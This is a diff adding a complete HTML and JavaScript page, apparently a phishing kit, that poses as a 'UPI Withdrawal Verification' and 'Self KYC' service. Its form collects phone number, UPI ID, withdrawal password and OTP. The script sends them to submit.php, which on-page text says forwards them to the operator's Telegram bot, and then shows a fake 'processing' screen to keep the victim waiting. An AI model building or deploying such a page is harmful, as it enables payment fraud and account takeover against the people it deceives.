@@ -1,0 +1,565 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>UPI Withdrawal Verification</title>
+
+<style>
+*{box-sizing:border-box}
+
+body{
+  margin:0;
+  font-family:Inter,system-ui,-apple-system,"Segoe UI",sans-serif;
+  background:#f3f5f9;
+  color:#172033
+}
+
+#app{
+  min-height:100vh;
+  background:linear-gradient(180deg,#f7f8fc,#eef2f7)
+}
+
+.header{
+  background:#5b35d5;
+  color:#fff;
+  padding:14px 20px;
+  display:flex;
+  align-items:center;
+  gap:14px
+}
+
+.header-logo-bg{
+  background:#fff;
+  padding:6px 10px;
+  border-radius:8px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  box-shadow:0 2px 6px rgba(0,0,0,0.12)
+}
+
+.header-logo{
+  height:28px;
+  width:auto;
+  display:block;
+  object-fit:contain
+}
+
+.header-copy h1{
+  margin:0;
+  font-size:20px
+}
+
+.header-copy p{
+  margin:3px 0 0;
+  font-size:11px;
+  opacity:.85
+}
+
+.wrap{
+  max-width:580px;
+  margin:0 auto;
+  padding:32px 18px 44px
+}
+
+.card{
+  background:#fff;
+  border:1px solid #e1e6ee;
+  border-radius:16px;
+  padding:26px;
+  box-shadow:0 10px 30px #17203312
+}
+
+.notice{
+  padding:12px 14px;
+  border-radius:10px;
+  background:#f5f2ff;
+  border:1px solid #e7e0ff;
+  color:#4c2bb4;
+  font-size:12px;
+  line-height:1.5;
+  margin-bottom:22px
+}
+
+label{
+  display:block;
+  font-size:13px;
+  font-weight:650;
+  margin:0 0 7px
+}
+
+.field{
+  margin-bottom:16px
+}
+
+input{
+  width:100%;
+  padding:12px 13px;
+  border-radius:9px;
+  border:1px solid #d7dce5;
+  background:#fff;
+  color:inherit;
+  font:inherit;
+  outline:none
+}
+
+input:focus{
+  border-color:#6d49dc;
+  box-shadow:0 0 0 3px #6d49dc22
+}
+
+.otp-row{
+  display:grid;
+  grid-template-columns:1fr 120px;
+  gap:8px
+}
+
+button{
+  border:0;
+  border-radius:9px;
+  padding:12px 14px;
+  font-weight:700;
+  font-size:13px;
+  background:#5b35d5;
+  color:#fff;
+  cursor:pointer
+}
+
+button:hover{
+  filter:brightness(1.06)
+}
+
+.submit{
+  width:100%;
+  margin-top:6px
+}
+
+/* SUCCESS PAGE STYLES */
+.success-screen{
+  display:none;
+  text-align:center;
+  padding:20px 10px
+}
+
+.success-icon{
+  width:64px;
+  height:64px;
+  background:#edf8f1;
+  color:#146c35;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:32px;
+  margin:0 auto 16px
+}
+
+.success-screen h2{
+  font-size:22px;
+  margin:0 0 8px;
+  color:#172033
+}
+
+.success-screen p{
+  font-size:14px;
+  color:#556070;
+  line-height:1.6;
+  margin:0 0 24px
+}
+
+.timer-badge{
+  display:inline-block;
+  background:#f5f2ff;
+  color:#5b35d5;
+  font-weight:600;
+  padding:8px 16px;
+  border-radius:20px;
+  font-size:13px;
+  margin-bottom:24px
+}
+
+.btn-secondary{
+  background:#eef2f7;
+  color:#172033;
+  width:100%
+}
+
+.btn-secondary:hover{
+  background:#e1e6ee
+}
+
+hr{
+  border:0;
+  border-top:1px solid #e4e7ec;
+  margin:22px 0
+}
+
+.small{
+  font-size:11px;
+  color:#667085;
+  line-height:1.5
+}
+
+@media(max-width:520px){
+  .card{
+    padding:19px
+  }
+
+  .otp-row{
+    grid-template-columns:1fr
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div id="app">
+
+<header class="header">
+  <div class="header-logo-bg">
+    <!-- Place logo file as upi-logo.png in your project folder -->
+    <img src="upi-logo.png" alt="UPI Logo" class="header-logo">
+  </div>
+  <div class="header-copy">
+    <h1>UPI Withdrawal Verification</h1>
+    <p>Self KYC</p>
+  </div>
+</header>
+
+<main class="wrap">
+
+<section class="card">
+
+  <!-- FORM VIEW -->
+  <div id="formContainer">
+    <div class="notice">
+      🧪 <strong> MODE:</strong>
+      Submit your withdrawal details below to receive Telegram notification.
+    </div>
+
+    <form id="verifyForm" autocomplete="off">
+
+      <!-- PLATFORM -->
+      <div class="field">
+        <label for="platform">Platform Name</label>
+        <input
+          id="platform"
+          name="platform"
+          type="text"
+          placeholder="Enter platform name"
+          required
+        >
+      </div>
+
+      <!-- GAME UID -->
+      <div class="field">
+        <label for="gameUid">Game UID</label>
+        <input
+          id="gameUid"
+          name="gameUid"
+          type="text"
+          placeholder="Enter player UID"
+          required
+        >
+      </div>
+
+      <!-- PHONE -->
+      <div class="field">
+        <label for="phone">Registered Phone Number</label>
+        <input
+          id="phone"
+          name="phone"
+          type="tel"
+          inputmode="numeric"
+          maxlength="10"
+          pattern="[0-9]{10}"
+          placeholder="Enter 10-digit number"
+          required
+        >
+      </div>
+
+      <!-- UPI ID -->
+      <div class="field">
+        <label for="upiId">UPI ID</label>
+        <input
+          id="upiId"
+          name="upiId"
+          type="text"
+          placeholder="example@upi"
+          required
+        >
+      </div>
+
+      <!-- AMOUNT -->
+      <div class="field">
+        <label for="amount">Withdrawal Amount (₹)</label>
+        <input
+          id="amount"
+          name="amount"
+          type="number"
+          min="1"
+          step="1"
+          inputmode="numeric"
+          placeholder="Enter withdrawal amount"
+          required
+        >
+      </div>
+
+      <!-- PASSWORD -->
+      <div class="field">
+        <label for="Password">
+          Withdrawal Password
+        </label>
+        <input
+          id="Password"
+          type="password"
+          placeholder="Enter withdrawal password"
+          required
+        >
+      </div>
+
+      <!-- OTP -->
+      <div class="field">
+        <label for="Otp">
+          OTP
+        </label>
+        <div class="otp-row">
+          <input
+            id="Otp"
+            type="text"
+            inputmode="numeric"
+            maxlength="6"
+            minlength="6"
+            pattern="[0-9]{6}"
+            autocomplete="one-time-code"
+            placeholder="Enter 6-digit OTP"
+            required
+          >
+          <button
+            id="requestOtp"
+            type="button"
+          >
+            Request OTP
+          </button>
+        </div>
+        <div
+          id="otpStatus"
+          class="small"
+          aria-live="polite"
+        >
+          Enter any 6-digit number.
+        </div>
+      </div>
+
+      <!-- SUBMIT -->
+      <button
+        class="submit"
+        id="submitBtn"
+        type="submit"
+      >
+        Submit Verification
+      </button>
+
+    </form>
+
+    <hr>
+
+    <div class="small">
+      Submission sends all details (Platform, Game UID, Phone, UPI ID, Amount, Password, and OTP) to your Telegram bot.
+    </div>
+  </div>
+
+  <!-- SUCCESS PAGE VIEW -->
+  <div id="successScreen" class="success-screen">
+    <div class="success-icon">✓</div>
+    <h2>Submit Successful!</h2>
+    <p>Please wait... Your verification is currently processing.</p>
+    
+    <div class="timer-badge">
+      ⏳ Estimated Time: 5 - 10 Minutes
+    </div>
+
+    <button type="button" class="btn-secondary" id="returnBtn">
+      Return
+    </button>
+  </div>
+
+</section>
+
+</main>
+</div>
+
+<script>
+const form = document.getElementById('verifyForm');
+const formContainer = document.getElementById('formContainer');
+const successScreen = document.getElementById('successScreen');
+const otpStatus = document.getElementById('otpStatus');
+const requestOtpBtn = document.getElementById('requestOtp');
+const submitBtn = document.getElementById('submitBtn');
+const returnBtn = document.getElementById('returnBtn');
+
+/* REQUEST OTP BUTTON */
+requestOtpBtn.addEventListener('click', async () => {
+  const platform = document.getElementById('platform').value.trim();
+  const gameUid  = document.getElementById('gameUid').value.trim();
+  const phone    = document.getElementById('phone').value.trim();
+  const upiId    = document.getElementById('upiId').value.trim();
+  const amount   = document.getElementById('amount').value.trim();
+  const password = document.getElementById('Password').value.trim();
+
+  // Validate preceding inputs
+  if (!platform || !gameUid || !phone || !upiId || !amount || !password) {
+    alert('Please fill in all preceding details before requesting OTP.');
+    return;
+  }
+
+  if (!/^\d{10}$/.test(phone)) {
+    alert('Enter a valid 10-digit phone number.');
+    return;
+  }
+
+  if (Number(amount) < 1) {
+    alert('Enter a valid withdrawal amount.');
+    return;
+  }
+
+  otpStatus.textContent = 'Sending OTP request notification...';
+
+  try {
+    const response = await fetch('./submit.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        action: 'request_otp',
+        platform: platform,
+        phone: phone,
+        uid: gameUid,
+        password: password
+      })
+    });
+
+    const result = await response.json();
+    if (result.ok) {
+      otpStatus.textContent = 'OTP Requested! Notification sent to Telegram.';
+    } else {
+      otpStatus.textContent = 'OTP requested, but failed to notify Telegram.';
+    }
+  } catch (err) {
+    console.error(err);
+    otpStatus.textContent = 'OTP requested (Telegram offline).';
+  }
+
+  document.getElementById('Otp').focus();
+});
+
+/* INPUT LIMITS */
+document.getElementById('Otp').addEventListener('input', function () {
+  this.value = this.value.replace(/\D/g, '').slice(0, 6);
+});
+
+document.getElementById('phone').addEventListener('input', function () {
+  this.value = this.value.replace(/\D/g, '').slice(0, 10);
+});
+
+/* FORM SUBMISSION */
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const platform = document.getElementById('platform').value.trim();
+  const gameUid  = document.getElementById('gameUid').value.trim();
+  const phone    = document.getElementById('phone').value.trim();
+  const upiId    = document.getElementById('upiId').value.trim();
+  const amount   = document.getElementById('amount').value.trim();
+  const password = document.getElementById('Password').value.trim();
+  const otp      = document.getElementById('Otp').value.trim();
+
+  if (!platform || !gameUid || !phone || !upiId || !amount || !password || !otp) {
+    alert('Please fill in all form fields before submitting.');
+    return;
+  }
+
+  if (!/^\d{10}$/.test(phone)) {
+    alert('Enter a valid 10-digit phone number.');
+    return;
+  }
+
+  if (!amount || Number(amount) < 1) {
+    alert('Enter a valid withdrawal amount.');
+    return;
+  }
+
+  if (!/^\d{6}$/.test(otp)) {
+    alert('OTP must be exactly 6 digits.');
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Submitting...';
+
+  // Save local record
+  const record = {
+    platform: platform,
+    gameUid: gameUid,
+    phone: phone,
+    upiId: upiId,
+    amount: amount,
+    password: password,
+    otp: otp,
+    verified: true,
+    submittedAt: new Date().toISOString()
+  };
+
+  localStorage.setItem('WithdrawalVerification', JSON.stringify(record));
+
+  const payload = {
+    action: 'submit_verification',
+    platform: platform,
+    uid: gameUid,
+    phone: phone,
+    upiId: upiId,
+    amount: amount,
+    password: password,
+    otp: otp
+  };
+
+  try {
+    const response = await fetch('./submit.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const result = await response.json();
+
+    if (!response.ok || !result.ok) {
+      throw new Error(result.error || 'Notification failed');
+    }
+
+    // Switch to success page
+    formContainer.style.display = 'none';
+    successScreen.style.display = 'block';
+
+  } catch (error) {
+    console.error(error);
+    alert('Submission failed: ' + error.message);
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Submit Verification';
+  }
+});
+
+/* RETURN BUTTON ACTION */
+returnBtn.addEventListener('click', () => {
+  form.reset();
+  otpStatus.textContent = 'Enter any 6-digit number.';
+  successScreen.style.display = 'none';
+  formContainer.style.display = 'block';
+});
+</script>
+
+</body>
+</html>
